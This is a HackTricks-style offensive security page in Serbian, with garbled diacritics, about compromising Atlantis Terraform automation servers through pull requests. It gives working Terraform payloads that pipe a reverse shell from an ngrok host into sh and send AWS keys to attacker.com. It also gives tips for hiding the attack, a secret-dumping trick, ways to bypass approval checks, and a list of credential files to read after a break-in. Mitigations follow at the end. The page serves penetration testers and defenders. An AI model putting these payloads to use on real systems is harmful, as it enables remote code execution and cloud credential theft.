# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis u su코tini poma쬰 vam da pokrenete terraform iz Pull Requests sa va코eg git servera.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. Idite na **atlantis releases page** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **preuzmite** onaj koji vam odgovara.
2. Kreirajte **li캜ni token** (sa pristupom repozitorijumu) va코eg **github** korisnika.
3. Izvr코ite `./atlantis testdrive` i to 캖e kreirati **demo repo** koji mo쬰te koristiti da **komunicirate sa atlantisom**.
1. Mo쬰te pristupiti web stranici na 127.0.0.1:4141.

### Atlantis Access

#### Git Server Credentials

**Atlantis** podr쬬va nekoliko git hostova kao 코to su **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Me캠utim, da bi pristupio repozitorijumima na tim platformama i izvr코io akcije, potrebno je da ima odre캠eni **privilegovan pristup** (barem prava za pisanje).\
[**Dokumentacija**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) preporu캜uje da se kreira korisnik na ovim platformama posebno za Atlantis, ali neki ljudi mogu koristiti li캜ne naloge.

{% hint style="warning" %}
U svakom slu캜aju, iz perspektive napada캜a, **Atlantis nalog** 캖e biti veoma **interesantan** **za kompromitovanje**.
{% endhint %}

#### Webhooks

Atlantis koristi opcionalno [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) da bi potvrdio da su **webhookovi** koje prima sa va코eg Git hosta **legitimni**.

Jedan na캜in da to potvrdite bio bi da **dozvolite zahteve da dolaze samo sa IP adresa** va코eg Git hosta, ali lak코i na캜in je kori코캖enje Webhook Secret-a.

Napomena: osim ako ne koristite privatni github ili bitbucket server, mora캖ete da izlo쬴te webhook krajnje ta캜ke internetu.

{% hint style="warning" %}
Atlantis 캖e **izlagati webhookove** kako bi git server mogao da mu 코alje informacije. Iz perspektive napada캜a, bilo bi zanimljivo znati **da li mo쬰te slati poruke**.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[Iz dokumentacije:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis pokre캖e Terraform jednostavno **izvr코avaju캖i `terraform plan` i `apply`** komande na serveru **na kojem je Atlantis hostovan**. Ba코 kao kada pokre캖ete Terraform lokalno, Atlantis treba kredencijale za va코 specifi캜ni provajder.

Na vama je kako [obezbedite kredencijale](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) za va코 specifi캜ni provajder Atlantsu:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) imaju svoje mehanizme za kredencijale provajdera. Pro캜itajte njihovu dokumentaciju.
* Ako pokre캖ete Atlantis u oblaku, mnogi oblaci imaju na캜ine da daju pristup API-ju oblaka aplikacijama koje se na njima pokre캖u, npr:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pretra쬴te "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Mnogi korisnici postavljaju promenljive okru쬰nja, npr. `AWS_ACCESS_KEY`, gde se Atlantis pokre캖e.
* Drugi kreiraju potrebne konfiguracione datoteke, npr. `~/.aws/credentials`, gde se Atlantis pokre캖e.
* Koristite [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) da dobijete kredencijale provajdera.

{% hint style="warning" %}
**Kontejner** u kojem **Atlantis** **radi** 캖e verovatno **sadr쬬ti privilegovane kredencijale** za provajdere (AWS, GCP, Github...) koje Atlantis upravlja putem Terraforma.
{% endhint %}

#### Web Page

Podrazumevano, Atlantis 캖e pokrenuti **web stranicu na portu 4141 na localhostu**. Ova stranica samo omogu캖ava da omogu캖ite/isklju캜ite atlantis apply i proverite status plana repozitorijuma i otklju캜ate ih (ne dozvoljava modifikaciju stvari, tako da nije toliko korisna).

Verovatno je ne캖ete na캖i izlo쬰nu internetu, ali izgleda da podrazumevano **nema potrebnih kredencijala** za pristup (a ako ih ima, `atlantis`:`atlantis` su **podrazumevani**).

### Server Configuration

Konfiguracija za `atlantis server` mo쬰 se specificirati putem komandnih linijskih zastavica, promenljivih okru쬰nja, konfiguracione datoteke ili kombinacije tri.

* Mo쬰te prona캖i [**ovde listu zastavica**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) koje podr쬬va Atlantis server.
* Mo쬰te prona캖i [**ovde kako da transformi코ete opciju konfiguracije u promenljivu okru쬰nja**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Vrednosti se **biraju u ovom redosledu**:

1. Zastavice
2. Promenljive okru쬰nja
3. Konfiguraciona datoteka

{% hint style="warning" %}
Napomena: u konfiguraciji mo쬰te prona캖i zanimljive vrednosti kao 코to su **tokeni i lozinke**.
{% endhint %}

#### Repos Configuration

Neke konfiguracije uti캜u na **kako se upravlja repozitorijumima**. Me캠utim, mogu캖e je da **svaki repo zahteva razli캜ite postavke**, tako da postoje na캜ini da se specificira svaki repo. Ovo je redosled prioriteta:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) datoteka. Ova datoteka se mo쬰 koristiti za specificiranje kako atlantis treba da tretira repo. Me캠utim, podrazumevano neke klju캜eve nije mogu캖e specificirati ovde bez nekih zastavica koje to omogu캖avaju.
1. Verovatno je potrebno da bude dozvoljeno zastavicama kao 코to su `allowed_overrides` ili `allow_custom_workflows`.
2. [**Server Side Config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Mo쬰te je proslediti sa zastavicom `--repo-config` i to je yaml koji konfiguri코e nove postavke za svaki repo (regexi su podr쬬ni).
3. **Podrazumevane** vrednosti.

**PR Protections**

Atlantis omogu캖ava da nazna캜ite da li 쬰lite da **PR** bude **`odobren`** od strane nekog drugog (캜ak i ako to nije postavljeno u za코titi grane) i/ili da bude **`spajivo`** (za코tite grane su pro코le) **pre nego 코to se izvr코i apply**. Sa sigurnosnog stanovi코ta, preporu캜uje se postaviti obe opcije.

U slu캜aju da je `allowed_overrides` True, ova pode코avanja mogu biti **prepisana u svakom projektu putem datoteke `/atlantis.yml`**.

**Scripts**

Konfiguracija repozitorijuma mo쬰 **specificirati skripte** koje 캖e se izvr코iti [**pre**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**posle**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) kada se **workflow izvr코i.**

Ne postoji opcija da se **specificiraju** ove skripte u **repo `/atlantis.yml`** datoteci.

**Workflow**

U konfiguraciji repozitorijuma (server side config) mo쬰te [**specificirati novi podrazumevani workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ili [**kreirati nove prilago캠ene workflow-e**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Tako캠e mo쬰te **specificirati** koji **repozi** mogu **pristupiti** novim generisanim.\
Zatim, mo쬰te dozvoliti **atlantis.yaml** datoteci svakog repozitorijuma da **specificira workflow koji 캖e se koristiti.**

{% hint style="danger" %}
Ako je [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) zastavica `allow_custom_workflows` postavljena na **True**, workflow-i se mogu **specificirati** u **`atlantis.yaml`** datoteci svakog repozitorijuma. Tako캠e je potencijalno potrebno da **`allowed_overrides`** tako캠e specificira **`workflow`** da **prepi코e workflow** koji 캖e se koristiti.\
Ovo 캖e u su코tini dati **RCE na Atlantis serveru bilo kojem korisniku koji mo쬰 pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Provera Conftest Politika**

Atlantis podr쬬va pokretanje **server-side** [**conftest**](https://www.conftest.dev/) **politika** protiv izlaza plana. Uobi캜ajeni slu캜ajevi kori코캖enja ovog koraka uklju캜uju:

* Odbijanje kori코캖enja liste modula
* Potvr캠ivanje atributa resursa u trenutku kreiranja
* Hvatanje nenamernih brisanja resursa
* Spre캜avanje bezbednosnih rizika (npr. izlaganje sigurnih portova javnosti)

Mo쬰te proveriti kako da ga konfiguri코ete u [**dokumentaciji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Atlantis Komande

[**U dokumentaciji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) mo쬰te prona캖i opcije koje mo쬰te koristiti za pokretanje Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Napadi

{% hint style="warning" %}
Ako tokom eksploatacije nai캠ete na ovu **gre코ku**: `Error: Error acquiring the state lock`

Mo쬰te je ispraviti pokretanjem:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Modifikacija konfiguracije u novom PR-u

Ako imate pristup za pisanje u repozitorijum, mo캖i 캖ete da kreirate novu granu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis plan`** (ili mo쬯a se automatski izvr코ava) **mo캖i 캖ete da RCE unutar Atlantis servera**.

Mo쬰te to uraditi tako 코to 캖ete [**naterati Atlantis da u캜ita spolja코nji izvor podataka**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Samo stavite payload kao 코to je slede캖i u `main.tf` datoteku:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Tajni Napad**

Mo쬰te izvesti ovaj napad 캜ak i na **tajniji na캜in**, prate캖i ove sugestije:

* Umesto da direktno dodate rev shell u terraform datoteku, mo쬰te **u캜itati spolja코nji resurs** koji sadr쬴 rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo쬰te prona캖i rev shell kod na [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* U spoljnim resursima, koristite **ref** funkciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, ne코to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Umesto** da kreirate **PR za master** da pokrenete Atlantis, **napravite 2 grane** (test1 i test2) i kreirajte **PR od jedne do druge**. Kada zavr코ite napad, samo **uklonite PR i grane**.

#### Atlantis plan Dump Tajni

Mo쬰te **dumpovati tajne kori코캖ene od strane terraform** pokretanjem `atlantis plan` (`terraform plan`) tako 코to 캖ete staviti ne코to poput ovoga u terraform datoteku:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Modifikacija konfiguracije u novom PR-u

Ako imate pristup za pisanje u repozitorijum, mo캖i 캖ete da kreirate novu granu i generi코ete PR. Ako mo쬰te **izvr코iti `atlantis apply`, mo캖i 캖ete da RCE unutar Atlantis servera**.

Me캠utim, obi캜no 캖ete morati da zaobi캠ete neke za코tite:

* **Mergeable**: Ako je ova za코tita postavljena u Atlantis-u, mo쬰te pokrenuti **`atlantis apply` samo ako je PR spojiv** (코to zna캜i da za코tita grane mora biti zaobi캠ena).
* Proverite potencijalne [**za코tite grane zaobila쬰nja**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Approved**: Ako je ova za코tita postavljena u Atlantis-u, neki **drugi korisnik mora odobriti PR** pre nego 코to mo쬰te pokrenuti `atlantis apply`
* Po defaultu, mo쬰te zloupotrebiti [**Gitbot token da zaobi캠ete ovu za코titu**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Pokretanje **`terraform apply` na malicioznom Terraform fajlu sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo treba da se pobrinete da neki payload poput slede캖ih zavr코i u `main.tf` fajlu:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sledite **preporukama iz prethodne tehnike** da izvr코ite ovaj napad na **diskretniji na캜in**.

#### Terraform Param Injection

Kada pokre캖ete `atlantis plan` ili `atlantis apply`, terraform se pokre캖e ispod, mo쬰te proslediti komande terraformu iz atlantisa komentari코u캖i ne코to poput:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Ne코to 코to mo쬰te pro캖i su env varijable koje mogu biti korisne za zaobila쬰nje nekih za코tita. Proverite terraform env varijable na [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Prilago캠eni Tok Rada

Pokretanje **malicious custom build commands** navedenih u `atlantis.yaml` datoteci. Atlantis koristi `atlantis.yaml` datoteku iz grane pull request-a, **ne** iz `master`.\
Ova mogu캖nost je pomenuta u prethodnom odeljku:

{% hint style="danger" %}
Ako je [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) zastavica `allow_custom_workflows` postavljena na **True**, tokovi rada mogu biti **specificirani** u **`atlantis.yaml`** datoteci svake repozitorije. Tako캠e je potencijalno potrebno da **`allowed_overrides`** specificira i **`workflow`** da bi se **prepisao tok rada** koji 캖e se koristiti.

Ovo 캖e u osnovi dati **RCE na Atlantis serveru bilo kojem korisniku koji mo쬰 pristupiti toj repozitoriji**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Obila쬰nje plan/apply za코tita

Ako je [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) oznaka `allowed_overrides` _konfigurisana_ sa `apply_requirements`, mogu캖e je da repozitorijum **modifikuje plan/apply za코tite da ih zaobi캠e**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Ako neko po코alje **`atlantis plan/apply` komentare na va코e validne pull zahteve,** to 캖e uzrokovati da terraform radi kada to ne 쬰lite.

맚avi코e, ako nemate pode코eno u **za코titi grane** da tra쬴 da se **ponovo proceni** svaki PR kada se **novi commit po코alje** na njega, neko bi mogao da **napisuje maliciozne konfiguracije** (proverite prethodne scenarije) u terraform konfiguraciji, pokrene `atlantis plan/apply` i dobije RCE.

Ovo je **pode코avanje** u Github za코titi grana:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Ako uspete da **ukradete webhook secret** koji se koristi ili ako **nema webhook secret** koji se koristi, mogli biste **pozvati Atlantis webhook** i **izvr코iti atlantis komande** direktno.

#### Bitbucket

Bitbucket Cloud **ne podr쬬va webhook secrets**. Ovo bi moglo omogu캖iti napada캜ima da **la쬴raju zahteve iz Bitbucket-a**. Osigurajte da dozvoljavate samo Bitbucket IP adrese.

* To zna캜i da bi **napada캜** mogao da napravi **la쬹e zahteve ka Atlantis-u** koji izgledaju kao da dolaze iz Bitbucket-a.
* Ako specificirate `--repo-allowlist`, onda bi mogli samo da la쬴raju zahteve koji se odnose na te repozitorijume, tako da bi najve캖a 코teta koju bi mogli da naprave bila planiranje/aplikacija na va코im repozitorijumima.
* Da biste to spre캜ili, dozvolite [Bitbucket IP adrese](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (vidi Izlazne IPv4 adrese).

### Post-Exploitation

Ako ste uspeli da dobijete pristup serveru ili barem ste dobili LFI, postoje neke zanimljive stvari koje biste trebali poku코ati da pro캜itate:

* `/home/atlantis/.git-credentials` Sadr쬴 vcs pristupne akreditive
* `/atlantis-data/atlantis.db` Sadr쬴 vcs pristupne akreditive sa vi코e informacija
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stanje datoteke
* Primer: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env varijable
* `/proc/[2-20]/cmdline` Cmd linija `atlantis server` (mo쬰 sadr쬬ti osetljive podatke)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Po코to bilo ko mo쬰 komentarisati na javnim pull zahtevima, 캜ak i sa svim dostupnim bezbednosnim mitigacijama, i dalje je opasno pokretati Atlantis na javnim repozitorijumima bez pravilne konfiguracije bezbednosnih pode코avanja.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ako radite na javnom repozitorijumu (코to nije preporu캜ljivo, vidi iznad), ne biste trebali postaviti `--allow-fork-prs` (podrazumevano je false) jer bilo ko mo쬰 otvoriti pull zahtev iz svog fork-a ka va코em repozitorijumu.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis zahteva da navedete allowlist repozitorijuma sa kojih 캖e prihvatati webhooks putem `--repo-allowlist` zastavice. Na primer:

* Specifi캜ni repozitorijumi: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Cela va코a organizacija: `--repo-allowlist=github.com/runatlantis/*`
* Svaki repozitorijum u va코em GitHub Enterprise instalaciji: `--repo-allowlist=github.yourcompany.com/*`
* Svi repozitorijumi: `--repo-allowlist=*`. Korisno kada ste u za코ti캖enoj mre쬴, ali opasno bez postavljanja webhook secret.

Ova zastavica osigurava da va코a Atlantis instalacija nije kori코캖ena sa repozitorijumima koje ne kontroli코ete. Pogledajte `atlantis server --help` za vi코e detalja.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Ako su napada캜i koji 코alju pull zahteve sa malicioznim Terraform kodom u va코em modelu pretnje, onda morate biti svesni da odobrenja za `terraform apply` nisu dovoljna. Mogu캖e je pokrenuti maliciozni kod u `terraform plan` koriste캖i [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ili specificiraju캖i maliciozni provajder. Ovaj kod bi mogao da eksfiltrira va코e akreditive.

Da biste to spre캜ili, mogli biste:

1. Ugraditi provajdere u Atlantis sliku ili hostovati i odbiti izlaz u produkciji.
2. Implementirati protokol za registraciju provajdera interno i odbiti javni izlaz, tako da kontroli코ete ko ima pristup za pisanje u registru.
3. Izmeniti va코u [server-side repo konfiguraciju](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan` korak da validira upotrebu zabranjenih provajdera ili data source-ova ili PR-ova od neodobrenih korisnika. Tako캠e mo쬰te dodati dodatnu validaciju u ovom trenutku, npr. zahtevaju캖i "thumbs-up" na PR pre nego 코to dozvolite da `plan` nastavi. Conftest bi mogao biti od pomo캖i ovde.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis bi trebao da se pokre캖e sa Webhook secret-ima postavljenim putem `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` promenljivih okru쬰nja. 캛ak i sa postavljenom `--repo-allowlist` zastavicom, bez webhook secret-a, napada캜i bi mogli slati zahteve ka Atlantis-u predstavljaju캖i se kao repozitorijum koji je na allowlisti. Webhook secrets osiguravaju da webhook zahtevi zapravo dolaze od va코eg VCS provajdera (GitHub ili GitLab).

Ako koristite Azure DevOps, umesto webhook secret-a dodajte osnovno korisni캜ko ime i lozinku.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps podr쬬va slanje osnovnog autentifikacionog header-a u svim webhook doga캠ajima. Ovo zahteva kori코캖enje HTTPS URL-a za va코u lokaciju webhook-a.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Ako koristite webhook secrets, ali je va코 saobra캖aj preko HTTP-a, tada bi webhook secrets mogli biti ukradeni. Omogu캖ite SSL/HTTPS koriste캖i `--ssl-cert-file` i `--ssl-key-file` zastavice.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Veoma se preporu캜uje omogu캖iti autentifikaciju u web servisu. Omogu캖ite BasicAuth koriste캖i `--web-basic-auth=true` i postavite korisni캜ko ime i lozinku koriste캖i `--web-username=yourUsername` i `--web-password=yourPassword` zastavice.

Tako캠e mo쬰te proslediti ovo kao promenljive okru쬰nja `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` i `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
